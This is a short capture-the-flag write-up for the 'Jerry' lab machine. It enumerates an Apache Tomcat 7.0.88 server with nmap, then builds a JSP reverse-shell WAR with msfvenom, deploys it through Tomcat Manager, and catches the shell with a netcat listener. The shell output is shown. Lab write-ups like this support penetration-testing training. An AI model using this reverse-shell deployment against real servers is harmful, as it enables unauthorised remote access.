# Jerry
Jerry is an Easy Windows machine, and is suggested practice for the OSCP Excam.

## Enumeration
### Nmap Scan
```bash
nmap -sC -sV -Pn 10.10.10.95
```
**Results**
```bash
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-09 10:11 BST
Nmap scan report for 10.10.10.95
Host is up (0.11s latency).
Not shown: 999 filtered ports
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-favicon: Apache Tomcat
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat/7.0.88

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.75 seconds
```
We can see from the above results that there is an Apache Tomcat service running on port 8080. 

### Web Server
We can visit the Apache Tomcat webserver on ```http://10.10.10.95:8080```.

From here we can confirm again that the version that is running is ```7.0.88``` and that it corresponds with the Nmap version check. No trickery here.

We can click around the web panel 

## Foothold
### Payload
We can generate a ```war``` payload using ```msfvenom```.
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.27 LPORT=1234 -f war > shell.war
```
We can upload this to to the Tomcat Manager. Creat a listener so that we can catch the incoming connection:
```bash
user@kali:~$ nc -lvnp 1234
listening on [any] 1234 ...
```
Now browse to ```http://10.10.10.95:8080/shell```. The payload will run and we will recieve a connection into our listener.
```bash
user@kali:~$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.10.14.27] from (UNKNOWN) [10.10.10.95] 49192
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\apache-tomcat-7.0.88>
```
